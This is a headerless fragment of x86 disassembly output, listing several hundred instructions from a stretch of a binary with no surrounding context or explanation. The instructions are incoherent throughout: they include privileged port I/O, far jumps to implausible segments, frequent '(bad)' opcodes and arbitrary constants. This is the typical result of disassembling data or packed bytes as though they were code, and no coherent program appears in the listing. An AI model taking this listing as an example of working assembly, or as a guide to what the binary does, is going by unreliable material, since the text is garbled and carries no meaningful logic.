  43bf94:	fisttp QWORD PTR [ecx]
  43bf96:	pop    es
  43bf97:	in     eax,dx
  43bf98:	pop    es
  43bf99:	xchg   dh,ah
  43bf9b:	add    BYTE PTR [ebp-0x2],dh
  43bf9e:	es out 0x15,eax
  43bfa1:	gs popa 
  43bfa3:	dec    esi
  43bfa4:	pop    ss
  43bfa5:	leave  
  43bfa6:	add    ecx,edi
  43bfa8:	sbb    dh,BYTE PTR [ecx-0x65762dc2]
  43bfae:	mov    ebx,0x2491ab23
  43bfb3:	mov    esi,0xda98d884
  43bfb8:	inc    esp
  43bfb9:	aam    0x0
  43bfbb:	test   DWORD PTR ds:0xd0b918e9,ebx
  43bfc1:	xor    eax,eax
  43bfc3:	cmp    DWORD PTR [ecx],ebp
  43bfc5:	and    BYTE PTR [esi-0x46],bh
  43bfc8:	sub    al,0x27
  43bfca:	xor    eax,0x333065cf
  43bfcf:	out    0x3,eax
  43bfd1:	jns    0x43bfde
  43bfd3:	inc    esi
  43bfd4:	and    BYTE PTR [ecx],cl
  43bfd6:	mov    bh,0xc9
  43bfd8:	pop    es
  43bfd9:	or     bl,ch
  43bfdb:	stos   BYTE PTR es:[edi],al
  43bfdc:	push   edx
  43bfdd:	push   cs
  43bfde:	mov    esp,0xf0226e8
  43bfe3:	out    dx,al
  43bfe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bfe5:	xor    eax,0x8053e7c5
  43bfea:	mov    dl,0x7a
  43bfec:	enter  0xab9e,0x88
  43bff0:	jge    0x43bfad
  43bff2:	ins    BYTE PTR es:[edi],dx
  43bff3:	out    dx,al
  43bff4:	add    DWORD PTR [ebp-0x68918c85],ebx
  43bffa:	jp     0x43c076
  43bffc:	(bad)  
  43bffd:	jp     0x43c031
  43bfff:	dec    ebp
  43c000:	add    BYTE PTR [edx],ch
  43c002:	xor    ah,BYTE PTR [edi+ebp*1-0x66]
  43c006:	jg     0x43c00d
  43c008:	inc    ecx
  43c009:	ss and eax,0xe1bd05f4
  43c00f:	jmp    0x521d:0x30b8156
  43c016:	mov    eax,edx
  43c018:	fild   DWORD PTR [edi-0x1c26b4a]
  43c01e:	xchg   esp,eax
  43c01f:	sbb    al,0x16
  43c021:	std    
  43c022:	xor    eax,DWORD PTR [ebx+0x5b]
  43c025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c026:	cmp    esp,DWORD PTR [esi-0x70]
  43c029:	inc    esi
  43c02a:	fadd   DWORD PTR [ebx-0x3a1d66e6]
  43c030:	ja     0x43c007
  43c032:	sar    bl,cl
  43c034:	mov    WORD PTR [edx-0xd2ae24e],fs
  43c03a:	mov    edx,0x5d3c46f3
  43c03f:	jmp    0x43c058
  43c041:	mov    DWORD PTR [eax-0x10],esp
  43c044:	les    edi,FWORD PTR ds:0xcd2a1059
  43c04a:	cmp    eax,DWORD PTR [ecx-0x12]
  43c04d:	adc    al,0x9d
  43c04f:	or     ebx,DWORD PTR [esi]
  43c051:	or     BYTE PTR [edi-0x2d],al
  43c054:	pop    ds
  43c055:	dec    ecx
  43c056:	les    esi,FWORD PTR [ebp+0x77fb6e1f]
  43c05c:	jae    0x43c0c6
  43c05e:	push   cs
  43c05f:	or     al,dh
  43c061:	lahf   
  43c062:	sub    esp,DWORD PTR [ecx+ebp*1-0x7]
  43c066:	push   ebp
  43c067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c068:	push   ds
  43c069:	stc    
  43c06a:	jle    0x43c08a
  43c06c:	out    dx,al
  43c06d:	pop    ecx
  43c06e:	je     0x43c05f
  43c070:	jle    0x43c094
  43c072:	iret   
  43c073:	jl     0x43c091
  43c075:	xchg   ecx,eax
  43c076:	sar    bl,1
  43c078:	ficom  DWORD PTR [edx-0x4e]
  43c07b:	into   
  43c07c:	push   ds
  43c07d:	sbb    DWORD PTR [ecx],esi
  43c07f:	push   cs
  43c080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c081:	and    al,0x3f
  43c083:	retf   
  43c084:	retf   0xdb9e
  43c087:	aaa    
  43c088:	sub    al,0xdf
  43c08a:	dec    ebp
  43c08b:	cmp    DWORD PTR [ecx-0x45],esi
  43c08e:	ret    0xa8d0
  43c091:	jmp    0xf043:0xf4eb74b4
  43c098:	in     eax,0xbb
  43c09a:	mov    ebp,0xa270c3e9
  43c09f:	inc    edx
  43c0a0:	mov    BYTE PTR [ecx+0x6fd745a1],cl
  43c0a6:	pusha  
  43c0a7:	jge    0x43c103
  43c0a9:	mov    ?,WORD PTR [edi+0x1313852f]
  43c0af:	out    dx,eax
  43c0b0:	std    
  43c0b1:	sub    ebx,0x963799ac
  43c0b7:	cmc    
  43c0b8:	mov    eax,0xded4bdff
  43c0bd:	jne    0x43c093
  43c0bf:	jge    0x43c0c7
  43c0c1:	xlat   BYTE PTR ds:[ebx]
  43c0c2:	fistp  DWORD PTR [ebx]
  43c0c4:	cmc    
  43c0c5:	push   ebp
  43c0c6:	ss sub eax,0x1eb22247
  43c0cc:	mov    ah,0x9
  43c0ce:	mov    edx,0xc3a0042f
  43c0d3:	test   DWORD PTR [ecx-0x3a032f16],ebx
  43c0d9:	lds    esi,FWORD PTR [ebp-0x5240c30d]
  43c0df:	xchg   esi,eax
  43c0e0:	sub    eax,0xa8161540
  43c0e5:	sub    edx,eax
  43c0e7:	in     al,0x26
  43c0e9:	or     al,0xf
  43c0eb:	scas   eax,DWORD PTR es:[edi]
  43c0ec:	mov    WORD PTR [edx],?
  43c0ee:	mov    bl,0x76
  43c0f0:	and    eax,0x85eb81dd
  43c0f5:	mov    dh,0x82
  43c0f7:	aas    
  43c0f8:	sub    eax,0x623d1830
  43c0fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c0fe:	jae    0x43c108
  43c100:	cmp    BYTE PTR [ebx],0x8a
  43c103:	xchg   ebp,eax
  43c104:	sar    DWORD PTR [ebx+edi*4],1
  43c107:	adc    DWORD PTR [edi+0x21d87071],eax
  43c10d:	xchg   DWORD PTR [esi-0xc],edx
  43c110:	cld    
  43c111:	and    ebx,ebx
  43c113:	stos   DWORD PTR es:[edi],eax
  43c114:	cmp    eax,ebx
  43c116:	mov    dh,0xb4
  43c118:	loopne 0x43c13e
  43c11a:	inc    esi
  43c11b:	mov    WORD PTR [edi+0x36139eb7],es
  43c121:	mov    ebx,0xe8fbdfdc
  43c126:	mov    edi,0x85b91a90
  43c12b:	scas   eax,DWORD PTR es:[edi]
  43c12c:	adc    BYTE PTR [eax],dl
  43c12e:	retf   0x3b24
  43c131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c132:	jnp    0x43c142
  43c134:	(bad)  
  43c135:	lods   eax,DWORD PTR ds:[esi]
  43c136:	mov    BYTE PTR ss:[edi-0x56],bh
  43c13a:	rcl    DWORD PTR ds:0x73905926,cl
  43c140:	imul   esp,esp,0xa6d6cd3c
  43c146:	mov    dl,BYTE PTR [edi-0x5a627875]
  43c14c:	inc    esp
  43c14d:	inc    esi
  43c14e:	mov    edx,0x815ba334
  43c153:	mov    edx,0x55a6b480
  43c158:	(bad)  
  43c159:	fld    QWORD PTR [edx]
  43c15b:	rdpmc  
  43c15d:	mov    ecx,0x224be0fa
  43c162:	fwait
  43c163:	sti    
  43c164:	and    ebp,DWORD PTR [ecx+0x249a6c6d]
  43c16a:	push   0x9ba6b9da
  43c16f:	sbb    DWORD PTR [ecx],esp
  43c171:	push   0x5f5b9edc
  43c176:	ret    0x573f
  43c179:	sub    ecx,ecx
  43c17b:	add    al,0x55
  43c17d:	jb     0x43c12b
  43c17f:	push   cs
  43c180:	adc    BYTE PTR [eax+0x7c],0x83
  43c184:	xor    dh,ch
  43c186:	push   ss
  43c187:	in     eax,dx
  43c188:	sbb    ebp,DWORD PTR [edx-0x76e15b44]
  43c18e:	cmp    dh,BYTE PTR [ebx]
  43c190:	aad    0x79
  43c192:	push   edx
  43c193:	stc    
  43c194:	push   ecx
  43c195:	mov    ds:0xe6ecaafb,al
  43c19a:	xor    BYTE PTR [esi-0x56],ah
  43c19d:	mov    edi,0xcefdb514
  43c1a2:	sahf   
  43c1a3:	push   ss
  43c1a4:	jmp    0x43c1d7
  43c1a6:	mov    cl,0x18
  43c1a8:	call   0x76358d46
  43c1ad:	sbb    eax,0xe3cd93bc
  43c1b2:	gs pop ebp
  43c1b4:	xchg   ebx,eax
  43c1b5:	mov    ecx,0x2a02e4ba
  43c1ba:	and    ch,dl
  43c1bc:	add    eax,0x1f337c8
  43c1c1:	fsubr  QWORD PTR [edx-0x3cf0e937]
  43c1c7:	call   0xd575:0x14d073e9
  43c1ce:	repz jmp 0x43c160
  43c1d1:	sub    ch,cl
  43c1d3:	jns    0x43c20c
  43c1d5:	shl    BYTE PTR [eax+esi*4-0x7e],0xa4
  43c1da:	mov    ebp,0xd7a11e24
  43c1df:	loope  0x43c18e
  43c1e1:	lahf   
  43c1e2:	or     esp,DWORD PTR [ecx]
  43c1e4:	cmp    ebx,DWORD PTR [esi-0x49132d3a]
  43c1ea:	hlt    
  43c1eb:	pop    eax
  43c1ec:	mov    es,WORD PTR [edx-0x1ddcbada]
  43c1f2:	test   DWORD PTR [edi+edx*4],0x1f85fc98
  43c1f9:	enter  0xb827,0x25
  43c1fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c1fe:	repz loopne 0x43c263
  43c201:	and    BYTE PTR [esi-0x471329b0],bh
  43c207:	in     al,0xa0
  43c209:	mov    al,0x8e
  43c20b:	dec    edx
  43c20c:	push   es
  43c20d:	mov    esi,0x725c7d2
  43c212:	push   ecx
  43c213:	jp     0x43c240
  43c215:	lods   eax,DWORD PTR ds:[esi]
  43c216:	and    cl,BYTE PTR [ebx]
  43c218:	push   es
  43c219:	cmp    BYTE PTR [ecx-0x544c4fac],0xe3
  43c220:	div    BYTE PTR [edx-0x78]
  43c223:	lds    ebx,FWORD PTR [edi]
  43c225:	(bad)  
  43c226:	jg     0x43c25e
  43c228:	jmp    0xb207:0xb1aac362
  43c22f:	add    al,0x62
  43c231:	push   edi
  43c232:	xor    eax,0x5247868b
  43c237:	in     al,0x16
  43c239:	jnp    0x43c1d3
  43c23b:	jl     0x43c22e
  43c23d:	and    DWORD PTR [eax-0x4546cc06],0x66122eb2
  43c247:	xlat   BYTE PTR ds:[ebx]
  43c248:	sbb    al,0x56
  43c24a:	or     bh,al
  43c24c:	inc    ebp
  43c24d:	leave  
  43c24e:	push   0x885cfae6
  43c253:	adc    DWORD PTR [edi],0xffffffc9
  43c256:	xor    bl,BYTE PTR [edi]
  43c258:	mov    ebx,0x98062a04
  43c25d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c25e:	dec    ebx
  43c25f:	ret    
  43c260:	push   ebx
  43c261:	add    DWORD PTR [edi],0x7fd02ced
  43c267:	retf   
  43c268:	mov    ecx,esi
  43c26a:	mov    ah,0xf4
  43c26c:	jge    0x43c2a0
  43c26e:	lock call 0xf405e3e9
  43c274:	sub    BYTE PTR [esi-0x45],ah
  43c277:	mov    al,ch
  43c279:	out    0xaa,eax
  43c27b:	out    dx,eax
  43c27c:	dec    edx
  43c27d:	cli    
  43c27e:	inc    edx
  43c27f:	sub    eax,0xebbf8923
  43c284:	push   ecx
  43c285:	repz popa 
  43c287:	xchg   edx,eax
  43c288:	inc    edi
  43c289:	lods   al,BYTE PTR ds:[esi]
  43c28a:	dec    eax
  43c28b:	loopne 0x43c306
  43c28d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c28e:	add    ebp,ebp
  43c290:	out    dx,eax
  43c291:	pop    edx
  43c292:	mov    ds:0xb49e4104,eax
  43c297:	fs pop ss
  43c299:	clc    
  43c29a:	mov    esp,0xb84d669
  43c29f:	pop    edx
  43c2a0:	pop    esi
  43c2a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c2a2:	dec    edi
  43c2a3:	fnstenv [ecx-0x4c307555]
  43c2a9:	cdq    
  43c2aa:	mov    ebp,0xaeb32d14
  43c2af:	js     0x43c27e
  43c2b1:	(bad)  
  43c2b2:	mov    esp,0x4c891221
  43c2b7:	(bad)  
  43c2b8:	sbb    bh,BYTE PTR [ecx+0x401d523]
  43c2be:	or     al,0x1c
  43c2c0:	in     eax,dx
  43c2c1:	fwait
  43c2c2:	cmp    ecx,DWORD PTR [edx+0x1345a667]
  43c2c8:	sub    eax,0x4f2c2b9a
  43c2cd:	adc    ebx,edx
  43c2cf:	js     0x43c2b1
  43c2d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c2d2:	arpl   bx,di
  43c2d4:	and    eax,0x3472d229
  43c2d9:	idiv   DWORD PTR [ecx]
  43c2db:	push   cs
  43c2dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c2dd:	pushf  
  43c2de:	sub    edx,ecx
  43c2e0:	dec    ebx
  43c2e1:	adc    al,0x29
  43c2e3:	adc    eax,0x28b2abce
  43c2e8:	jl     0x43c2f0
  43c2ea:	mov    dh,0xc4
  43c2ec:	les    edi,FWORD PTR [ebp+0x55]
  43c2ef:	daa    
  43c2f0:	add    eax,0x6aec2fb3
  43c2f5:	cmp    DWORD PTR [edi],ecx
  43c2f7:	cdq    
  43c2f8:	sbb    al,0x19
  43c2fa:	add    ah,BYTE PTR [edi+0x311cf846]
  43c300:	mov    dl,0x80
  43c302:	rol    ebp,cl
  43c304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c305:	call   0xa8d0:0xa7d063d1
  43c30c:	pop    ebp
  43c30d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c30e:	rcl    BYTE PTR [ecx+0x74b7fce2],cl
  43c314:	inc    BYTE PTR [edi+eax*4]
  43c317:	loopne 0x43c35e
  43c319:	imul   edi,DWORD PTR [edi+0x304eceec],0xffffff8d
  43c320:	and    DWORD PTR [ecx+0x674cf62d],ecx
  43c326:	and    ecx,ebx
  43c328:	xchg   ecx,eax
  43c329:	mov    ds:0xc367e63b,al
  43c32e:	jo     0x43c377
  43c330:	call   0x80a6ff00
  43c335:	jnp    0x43c2f4
  43c337:	push   esp
  43c338:	call   0x3ddc4665
  43c33d:	mov    al,ds:0xd459c64b
  43c342:	sub    eax,0xbeb83b4e
  43c347:	xchg   BYTE PTR [esi-0x6ebb4a1f],ah
  43c34d:	retf   
  43c34e:	xlat   BYTE PTR ds:[ebx]
  43c34f:	(bad)  
  43c350:	push   ebp
  43c351:	(bad)  
  43c352:	jl     0x43c348
  43c354:	test   DWORD PTR [edx+ebx*8-0x7e76b203],esp
  43c35b:	popa   
  43c35c:	mov    al,BYTE PTR [ebp-0x4b]
  43c35f:	sbb    al,0xdf
  43c361:	scas   al,BYTE PTR es:[edi]
  43c362:	retf   0x4566
  43c365:	stos   DWORD PTR es:[edi],eax
  43c366:	push   edx
  43c367:	clc    
  43c368:	push   es
  43c369:	inc    esi
  43c36a:	jb     0x43c349
  43c36c:	xchg   ebp,eax
  43c36d:	dec    ebx
  43c36e:	imul   ebp,DWORD PTR [ecx+0x44],0xe7a86ba6
  43c375:	or     DWORD PTR [ebp-0x34661d5e],esp
  43c37b:	sub    eax,0x3c935898
  43c380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c381:	mov    bh,BYTE PTR [esi+edi*1]
  43c384:	mov    ecx,0xea4883cc
  43c389:	aaa    
  43c38a:	jbe    0x43c3be
  43c38c:	loope  0x43c340
  43c38e:	call   0x222e8905
  43c393:	out    dx,al
  43c394:	pop    ebp
  43c395:	dec    ecx
  43c396:	xchg   esi,eax
  43c397:	or     cl,al
  43c399:	pop    esp
  43c39a:	adc    DWORD PTR [ebp+esi*8+0x66f34ac8],0x49
  43c3a2:	jp     0x43c423
  43c3a4:	jbe    0x43c32e
  43c3a6:	xor    al,BYTE PTR [ecx]
  43c3a8:	enter  0x485,0x61
  43c3ac:	loope  0x43c42c
  43c3ae:	push   0xb49fc0e8
  43c3b3:	and    BYTE PTR fs:[eax+0x2],dh
  43c3b7:	mov    ecx,0xeed1ed85
  43c3bc:	xchg   ebp,eax
  43c3bd:	les    ebp,FWORD PTR [ebp+0x3f]
  43c3c0:	push   ebp
  43c3c1:	or     DWORD PTR [eax+0x11],edi
  43c3c4:	hlt    
  43c3c5:	leave  
  43c3c6:	inc    esi
  43c3c7:	jne    0x43c38d
  43c3c9:	div    DWORD PTR [eax+0x6f]
  43c3cc:	lea    ebx,[ebx+edi*8-0x47fa0cab]
  43c3d3:	mov    al,ds:0x17f3bafb
  43c3d8:	mov    es,WORD PTR [ebp+edi*4+0x34]
  43c3dc:	fisubr WORD PTR ds:0x1c85a3da
  43c3e2:	retf   
  43c3e3:	repz inc ecx
  43c3e5:	std    
  43c3e6:	pop    edi
  43c3e7:	popf   
  43c3e8:	sbb    cl,BYTE PTR [ecx]
  43c3ea:	test   bh,al
  43c3ec:	hlt    
  43c3ed:	or     eax,0x9f418f59
  43c3f2:	dec    ebx
  43c3f3:	std    
  43c3f4:	xchg   ecx,eax
  43c3f5:	dec    edx
  43c3f6:	cmc    
  43c3f7:	push   0x44767a7c
  43c3fc:	cld    
  43c3fd:	dec    ebp
  43c3fe:	mov    ebp,0xa89b074
  43c403:	ins    DWORD PTR es:[edi],dx
  43c404:	or     DWORD PTR [ecx],edx
  43c406:	iret   
  43c407:	pushf  
  43c408:	inc    eax
  43c409:	adc    esi,DWORD PTR [ebp-0x3e53b72c]
  43c40f:	xchg   edx,eax
  43c410:	imul   esi,edi,0xffffffb3
  43c413:	inc    esp
  43c414:	mov    eax,ebp
  43c416:	(bad)
  43c41a:	sti    
  43c41b:	jmp    0x43c3e3
  43c41d:	jle    0x43c49e
  43c41f:	sbb    DWORD PTR [edx],ebx
  43c421:	or     DWORD PTR [esi+0x63],ebx
  43c424:	mov    ch,0xd4
  43c426:	mov    cl,0x2d
  43c428:	add    eax,0x6c414b9a
  43c42d:	mov    esp,0x522c3967
  43c432:	sbb    eax,0xc84957e7
  43c437:	push   esp
  43c438:	pop    edi
  43c439:	or     edi,DWORD PTR [esi+0x5a083b10]
  43c43f:	repnz xor eax,0x4be9fffb
  43c445:	or     ah,cl
  43c447:	aaa    
  43c448:	push   ds
  43c449:	mov    DWORD PTR [edx-0x5b],edx
  43c44c:	or     DWORD PTR [esi],0xb682b8d5
  43c452:	imul   edx,eax,0x75
  43c455:	bound  esp,QWORD PTR [ecx]
  43c457:	cmp    DWORD PTR [edi+0x16c9d827],esp
  43c45d:	in     eax,0x80
  43c45f:	scas   eax,DWORD PTR es:[edi]
  43c460:	outs   dx,DWORD PTR ds:[esi]
  43c461:	cmp    eax,0x130686b7
  43c466:	push   edi
  43c467:	(bad)  
  43c469:	jmp    FWORD PTR [ecx-0x427aa38f]
  43c46f:	pop    esp
  43c470:	or     ebx,DWORD PTR [ebp+0x66]
  43c473:	xchg   DWORD PTR [ebp-0x48],esi
  43c476:	lock imul ecx,DWORD PTR [bx+di],0x9125438a
  43c47e:	lods   eax,DWORD PTR ds:[esi]
  43c47f:	jmp    0x1fe5d3ec
  43c484:	sbb    esi,edx
  43c486:	dec    ecx
  43c487:	pop    ebx
  43c488:	sbb    BYTE PTR [eax-0x5998ab1a],ch
  43c48e:	mov    ecx,0xec9893b9
  43c493:	and    BYTE PTR [esi+0x45],ch
  43c496:	adc    edi,DWORD PTR [edx]
  43c498:	jp     0x43c48c
  43c49a:	(bad)  
  43c49b:	retf   0x76e3
  43c49e:	retf   0x89aa
  43c4a1:	lds    edi,FWORD PTR [ebx+0x74b55e14]
  43c4a7:	xor    ebp,DWORD PTR [edx-0x37580e7b]
  43c4ad:	inc    eax
  43c4ae:	(bad)  
  43c4af:	in     al,0x5c
  43c4b1:	mov    ds:0xd916ff1e,eax
  43c4b6:	mov    dl,0xb4
  43c4b8:	sar    cl,cl
  43c4ba:	add    BYTE PTR [esi-0x13],ch
  43c4bd:	sub    BYTE PTR [ecx+0x2ba0584c],ah
  43c4c3:	out    dx,al
  43c4c4:	xor    BYTE PTR [edi+0x22c56bd4],dh
  43c4ca:	cmp    BYTE PTR [esi-0x35],al
  43c4cd:	(bad)  
  43c4ce:	mov    edx,0xb7b254f4
  43c4d3:	stos   DWORD PTR es:[edi],eax
  43c4d4:	xlat   BYTE PTR ds:[ebx]
  43c4d5:	cld    
  43c4d6:	(bad)  
  43c4d8:	mov    esi,0xa5eb5fa
  43c4dd:	xor    dh,BYTE PTR [eax-0x11]
  43c4e0:	and    ecx,ecx
  43c4e2:	add    ah,dh
  43c4e4:	ret    
  43c4e5:	push   esi
  43c4e6:	jmp    0xbe88dee
  43c4eb:	leave  
  43c4ec:	outs   dx,DWORD PTR ds:[esi]
  43c4ed:	mov    cl,0x67
  43c4ef:	push   cs
  43c4f0:	push   esp
  43c4f1:	xchg   esi,eax
  43c4f2:	aas    
  43c4f3:	push   0xac3fd91b
  43c4f8:	jnp    0x43c4f7
  43c4fa:	mov    ebp,0x4bae0df0
  43c4ff:	push   esi
  43c500:	ret    0xa870
  43c503:	(bad)  
  43c504:	cmc    
  43c505:	mov    ds:0x4fa15dc3,eax
  43c50a:	jne    0x43c4e6
  43c50c:	test   eax,0x63995c8c
  43c511:	pop    ebx
  43c512:	sub    BYTE PTR [edx+0x76],dh
  43c515:	test   al,0xc4
  43c517:	fsub   QWORD PTR [edx]
  43c519:	mov    al,BYTE PTR [esi-0xac21fd5]
  43c51f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c520:	sbb    BYTE PTR [ecx+0x13],al
  43c523:	enter  0xa118,0x2b
  43c527:	mov    BYTE PTR [esp+eax*1-0x772efad],bl
  43c52e:	jnp    0x43c4bc
  43c530:	mov    edx,0xb9659e03
  43c535:	adc    dh,BYTE PTR ds:0x3b9f30f3
  43c53b:	icebp  
  43c53c:	sub    al,0xe5
  43c53e:	xchg   ebp,eax
  43c53f:	mov    eax,ds:0x2c3f9242
  43c544:	js     0x43c516
  43c546:	mov    esi,0x32d5a2c4
  43c54b:	cmc    
  43c54c:	push   ebp
  43c54d:	fidiv  DWORD PTR [edx]
  43c54f:	jmp    0x43c5b4
  43c551:	sbb    DWORD PTR [ebx-0x3856dc80],esp
  43c557:	cmc    
  43c558:	add    ebp,DWORD PTR [eax-0x5852d5ee]
  43c55e:	cmp    esp,eax
  43c560:	mov    dh,0xe3
  43c562:	leave  
  43c563:	jmp    0xca2226ad
  43c568:	dec    esi
  43c569:	mov    eax,0xb16644b3
  43c56e:	jle    0x43c5a6
  43c570:	in     eax,0xcd
  43c572:	adc    eax,0x549a49ea
  43c577:	inc    edx
  43c578:	sbb    bl,BYTE PTR [ecx-0xc]
  43c57b:	inc    ecx
  43c57c:	mov    ds:0x789290df,al
  43c581:	mov    ds:0x8b3d9aeb,al
  43c586:	(bad)  
  43c587:	pop    edx
  43c588:	out    dx,al
  43c589:	adc    ah,bh
  43c58b:	sti    
  43c58c:	mov    ch,0xee
  43c58e:	in     eax,0x54
  43c590:	mov    ebp,0x1a32d79a
  43c595:	mov    eax,ds:0x6fc4a26b
  43c59a:	mov    ebx,0xd580cd45
  43c59f:	pop    edi
  43c5a0:	mov    cl,0x5
  43c5a2:	mov    al,0x34
  43c5a4:	loop   0x43c5e4
  43c5a6:	stos   BYTE PTR es:[edi],al
  43c5a7:	cmp    esp,DWORD PTR [ebp-0x681a2509]
  43c5ad:	test   eax,0xe9253d5b
  43c5b2:	xor    ebp,DWORD PTR [ebp+0x12]
  43c5b5:	retf   0x8053
  43c5b8:	loopne 0x43c564
  43c5ba:	mov    esp,DWORD PTR [edi-0x5e]
  43c5bd:	pop    edi
  43c5be:	es mov dh,0xe5
  43c5c1:	pushf  
  43c5c2:	inc    edi
  43c5c3:	fdivr  DWORD PTR [edi]
  43c5c5:	test   eax,0xce518733
  43c5ca:	ins    DWORD PTR es:[edi],dx
  43c5cb:	xor    ebx,esp
  43c5cd:	pushf  
  43c5ce:	mov    cl,0xf1
  43c5d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c5d1:	das    
  43c5d2:	adc    esp,ebp
  43c5d4:	in     al,0x50
  43c5d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c5d7:	dec    edx
  43c5d8:	das    
  43c5d9:	mov    DWORD PTR [eax+esi*8-0x2057a494],edi
  43c5e0:	in     eax,dx
  43c5e1:	add    ah,BYTE PTR [ebx+0x75]
  43c5e4:	mov    edi,edx
  43c5e6:	fwait
  43c5e7:	in     eax,dx
  43c5e8:	jne    0x43c632
  43c5ea:	mov    edi,0x4067eb1f
  43c5ef:	in     eax,0xe5
  43c5f1:	icebp  
  43c5f2:	and    ah,bh
  43c5f4:	push   esi
  43c5f5:	mov    ch,0x7b
  43c5f7:	mov    dh,0xb6
  43c5f9:	rcr    BYTE PTR [eax+0x67a0b969],cl
  43c5ff:	das    
  43c600:	add    edi,DWORD PTR [edx-0x581ea175]
  43c606:	add    eax,esi
  43c608:	or     ch,dh
  43c60a:	cmp    eax,0x7c70755c
  43c60f:	out    0x37,eax
  43c611:	int3   
  43c612:	call   0x76d07442
  43c617:	cmp    al,0x1
  43c619:	test   al,0xa3
  43c61b:	xlat   BYTE PTR ds:[ebx]
  43c61c:	xchg   ebp,eax
  43c61d:	xlat   BYTE PTR ds:[ebx]
  43c61e:	mov    dh,0xe1
  43c620:	pop    ebx
  43c621:	mov    bh,0x4b
  43c623:	adc    DWORD PTR [edi],ecx
  43c625:	(bad)  
  43c626:	xchg   esi,eax
  43c627:	aad    0x66
  43c629:	cdq    
  43c62a:	test   DWORD PTR [ebp+0x5360e109],0x64b71c5e
  43c634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c635:	jne    0x43c5e1
  43c637:	fsub   DWORD PTR [ebp+0x5b]
  43c63a:	stos   DWORD PTR es:[edi],eax
  43c63b:	lock js 0x43c60d
  43c63e:	fild   QWORD PTR [esi-0x1f7936d0]
  43c644:	mov    cl,0x20
  43c646:	pop    ds
  43c647:	rcr    bh,cl
  43c649:	push   ss
  43c64a:	xor    DWORD PTR [ebx],ebp
  43c64c:	dec    eax
  43c64d:	bound  edx,QWORD PTR ds:0x306d456c
  43c653:	in     eax,dx
  43c654:	jbe    0x43c5e7
  43c656:	mov    ds:0x75091706,al
  43c65b:	push   edx
  43c65c:	fwait
  43c65d:	int3   
  43c65e:	jl     0x43c60f
  43c660:	leave  
  43c661:	mov    eax,ds:0x388378cb
  43c666:	add    dh,BYTE PTR [edi]
  43c668:	inc    edi
  43c669:	xchg   ecx,eax
  43c66a:	aad    0xd5
  43c66c:	mov    eax,0x2554c765
  43c671:	adc    al,0xd4
  43c673:	push   ds
  43c674:	add    eax,0xc662fb9f
  43c679:	and    eax,0x3b5c0eb9
  43c67e:	jne    0x43c69e
  43c680:	add    al,BYTE PTR [edi-0x45]
  43c683:	les    ebx,FWORD PTR [esi+ecx*4-0x40]
  43c687:	jge    0x43c6df
  43c689:	jae    0x43c619
  43c68b:	sbb    eax,0xcd35c13d
  43c690:	ret    0x3f6c
  43c693:	mov    al,ds:0x44ba32b1
  43c698:	and    eax,0x757a722d
  43c69d:	pushf  
  43c69e:	into   
  43c69f:	test   DWORD PTR [ecx],0x333f4855
  43c6a5:	in     eax,0x58
  43c6a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c6a8:	adc    eax,0xdd4b291
  43c6ad:	cmp    al,0x72
  43c6af:	pop    ds
  43c6b0:	push   ebp
  43c6b1:	mov    al,0xe3
  43c6b3:	in     eax,0x8d
  43c6b5:	dec    ebx
  43c6b6:	ret    0x1f63
  43c6b9:	mov    DWORD PTR [edi-0x2f],edx
  43c6bc:	sti    
  43c6bd:	push   cs
  43c6be:	inc    edx
  43c6bf:	jge    0x43c71d
  43c6c1:	sbb    BYTE PTR [ecx+ecx*2],ch
  43c6c4:	gs xor al,0xeb
  43c6c7:	div    BYTE PTR [ecx+0x22e6fff2]
  43c6cd:	cmp    DWORD PTR [eax+0x4d],esp
  43c6d0:	sbb    DWORD PTR [edi],ebp
  43c6d2:	push   esi
  43c6d3:	call   0x1fc1c2df
  43c6d8:	and    al,0x9d
  43c6da:	mov    esi,DWORD PTR ds:0xbe848668
  43c6e0:	sbb    al,0xf9
  43c6e2:	sti    
  43c6e3:	out    0x2,eax
  43c6e5:	call   0xde5af965
  43c6ea:	sbb    eax,0xdba057c4
  43c6ef:	out    dx,al
  43c6f0:	fcmovne st,st(5)
  43c6f2:	lahf   
  43c6f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c6f4:	sbb    cl,bh
  43c6f6:	jae    0x43c737
  43c6f8:	stc    
  43c6f9:	ss inc eax
  43c6fb:	into   
  43c6fc:	xchg   DWORD PTR [esi+ecx*1-0x737988e7],ecx
  43c703:	mov    WORD PTR [eax],?
  43c705:	test   al,0xb9
  43c707:	add    al,0x1f
  43c709:	push   cs
  43c70a:	ins    BYTE PTR es:[edi],dx
  43c70b:	pop    es
  43c70c:	lods   al,BYTE PTR ds:[esi]
  43c70d:	push   esi
  43c70e:	xor    DWORD PTR [edx+ebx*2],edx
  43c711:	jne    0x43c75a
  43c713:	in     eax,0x1d
  43c715:	jns    0x43c6d8
  43c717:	test   al,0x91
  43c719:	inc    esi
  43c71a:	(bad)  
  43c71b:	mov    dl,0x9b
  43c71d:	jge    0x43c6c2
  43c71f:	xlat   BYTE PTR ds:[ebx]
  43c720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c721:	repz mov bl,0xe8
  43c724:	inc    esp
  43c725:	dec    ebp
  43c726:	fild   WORD PTR [esi-0x76d9e526]
  43c72c:	pop    ss
